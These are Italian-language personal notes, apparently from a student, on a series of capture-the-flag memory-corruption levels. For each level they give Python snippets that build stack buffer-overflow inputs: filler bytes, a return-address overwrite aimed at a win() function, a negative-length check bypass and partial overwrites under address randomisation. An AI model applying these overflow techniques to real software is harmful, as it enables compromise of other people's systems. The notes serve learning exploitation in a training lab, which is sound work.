# Qui inseriro le spiegazioni degli esercizi di memory error di pwn

## Spiegazione generale

+ Gli esercizi seguenti richiedono di rompere la memoria in 8 livelli di difficoltà, andando a richiedere sempre quanti byte inviare e poi cosa effettivamente inviare.  
I livelli complessivamente sono 16, suddivisi nella versione .0 e nella versione .1, che si differenziano per essere le versioni .1 senza alcuna spiegazione di cosa tu debba fare, sebbene poi siano uguali alla versione .0.  
I primi livelli sono molto semplici da risolvere, tanto da poterli risolvere scrivendo a mano, ma poi verranno richiesti input particolari per cui sarà necessario passare particolari byte e approntare un sistema già pronto di python.  
Nello specifico sarà necessario creare un file binario in cui scrirevere più componenti a seconda di ciò che richiede la challenge:

    ```py
    with open("input.bin", "wb") as f:
        f.write(b'68')
        f.write(b'\x90'*68)     #don't know why ma metterne sempre uno in più dl richiesto qua, è qualcosa legato alla scrittura di python
    ```

    Ciò che fa è aprire/creare un file .bin e scriverci dentro i byte passati. Quando scrivo "f.write(b'\x90'*68)" intendo scrivere 68 volte il byte 90 (\x serve per indicare il valore in byte).

## Esercizio 1

+ Il primo esercizio è molto semplice e richiede di andare a sovrascrivere il valore 00 della variabile win con qualunque valore. La challenge mette a disposizione un buffer di 61 byte e posiziona win 64 byte dopo l'inizio del buffer.  
Basta inserire un valore di offset maggiore o uguale della distanza tra l'inizio del buffer e la posizione della variabile win e poi inserire una sequenza di caratteri a caso. Anche se triggheriamo la guardia del canarino la challenge sarà risolta uguale.

    ```py
    with open("input.bin", "wb") as f:
        f.write(b'68')
        f.write(b'\x90'*68)
    ```

## Esercizio 1.1

+ Il procedimento è lo stesso dell'esercizio 1 normale, semplicemente non vengono date istruzioni

    ```py
    with open("input.bin", "wb") as f:
        f.write(b'68')
        f.write(b'\x90'*68)
    ```

## Esercizio 2.0

+ In questa challenge viene testato lo stack. Come la challenge 1.0 è richiesto di passare un numero di byte e poi i byte effettivi per modificare il valore della win variabile, senza preoccuparsi troppo dello smashing effettivo della memoria.

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'577')
    f.write(b'\x90'*578)
    ```

## Esercizio 2.1

+ Idem come sopra, ma sta volta senza minimi indizzi. Con lo stesso input di sopra funziona.

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'577')
    f.write(b'\x90'*578)
    ```

## Esercizio 3.0

+ Questo esercizio richiede di modificare il return address cosicchè possa essere attivata la funzione win() che stampa la flag. Per farlo è necessario sapere a che inidirizzo parte la challenge, quindi bisogna usare objdump per cercarlo, facendo ```sh objdump -d come_cazzo_si_chiama```.  
Una volta trovata la posizione bisogna capire dove si trova nello stack il return address. Questa challenge non posiziona particolari protezioni (tipo il canary boundary), quindi si può andare per tentativi

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'98')
    f.write(b'\x90'*89)
    f.write(b'\x49\x22\x40')
    ```

## Esercizio 3.1

+ Esercizio al buio. Il primo passo è trovare il return address corretto, quindi con objdump cerco il numero della prima istruzione della funzione win ```sh objdump -d come_cazzo_si_chiama```.  
Poi devo capire dove si trova il return address nello stack, e lo faccio cercando la segmentation fault, che tendenzialmente è un multiplo di 8. Quindi provo diverse quantità di input fino a trovare il primo valore che dà segmentation fault.  
Questo ci permette di capire che il return address sarà 8 byte dopo il primo segmentation fault. Ad esempio qui segmentation fault scatta a 16 byte dal fondo dello stack, e dunque  return address è a 8 byte dal fondo.

    ```s
    | 0x00007fff0a427b00 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
    | 0x00007fff0a427b08 (rsp+0x0078) | c0 7a 42 0a ff 7f 00 00 | 0x00007fff0a427ac0 |
    | 0x00007fff0a427b10 (rsp+0x0080) | 40 8b 42 0a ff 7f 00 00 | 0x00007fff0a428b40 |
    | 0x00007fff0a427b18 (rsp+0x0088) | 8a 29 40 00 00 00 00 00 | 0x000000000040298a |
    +---------------------------------+-------------------------+--------------------+
    ```

    qui ad esempio il return address è posizionato a 0x00007fff0a427b18 (quindi inizia con 8a) mentre il segmentation fault scatta quando viene sovrascritto all'inidirizzo 0x00007fff0a427b10 (quello che inizia con 40)

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'180')
    f.write(b'\x90'*97)     #metterne sempre uno in più
    f.write(b'\x90'*8)
    f.write(b'\x24\x15\x40')
    #97 da segmentation, quindi 96+8+return
    ```

## Esercizio 4.0

+ Esercizio simile al 3.0, ma che richiede di rompere il controllo sulla lunghezza dell'input, che controllerà se è maggiore della grandezza del buffer generando errore, semplicemnte mettendo -1 o un valore minore di 0 come grandezza. Poi come sopra lavoro con obj per trovare l'inidirizzo con cui sovrascrivere

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'-1')
    f.write(b'\x90'*113)     #metterne sempre uno in più
    f.write(b'\x90'*8)
    f.write(b'\x4e\x1d\x40')
    ```

## Esercizio 4.1

+ Esattamente un mix tra 4.0 e 3.1, devo mettere il primo valore a -1, lavorare con objdump per trovare l'indirizzo e con il segmentation fault per trovare il giusto offset

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'-1')
    f.write(b'\x56'*65)     #metterne sempre uno in più
    f.write(b'\x90'*8)
    f.write(b'\xc8\x1c\x40')
    ```

## Livello 5.0

+ Questo livello richiede di rompere ancora di più il controllo sulla lunghezza del buffer, facendogli fare una moltiplicazione tra numeri negativi, ma non sono riuscito ad andare avanti ricevendo sempre l'errore di bad address

## Livello 6.0

+ Al livello 6 il segmentation scatta con 7 byte rimasti, quindi non al primo della riga ma al secondo byte della riga

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'100')
    f.write(b'\x56'*81)     #metterne sempre uno in più
    f.write(b'\x90'*8)
    f.write(b'\xe0\x1e\x40')
    ```

## Livello 6.1

+ Livello al buio

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'100')
    f.write(b'\x56'*65)     #metterne sempre uno in più
    f.write(b'\x90'*8)
    f.write(b'\xba\x14\x40')
    ```

## Livello 7.0

+ Questo livello è come il sesto, ma richiede di essere runnato più volte perchè la posizione cambia ad ogni iterazione, ma solo per il quarto byte (gli altri 3 rimangono uguali).  
Nell'esempio sotto *d04 sono i 3 byte che non cambiano mai, mentre il quarto, in questo caso 1, può cambiare in 16 valori diversi ovviamente

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'100')
    f.write(b'\x56'*65)     #metterne sempre uno in più
    f.write(b'\x90'*8)
    f.write(b'\x04\x1d')    #1d04
    ```

## Livello 7.1

+ Livello al buio, devo cercare il segmentation a caso e poi objdump per 3 bit su 4.

    ```py
    with open("input.bin", "wb") as f:
    f.write(b'100')
    f.write(b'\x56'*65)     #metterne sempre uno in più
    f.write(b'\x90'*8)
    f.write(b'\x04\x1d')    #1d04
    ```

## Livello 8
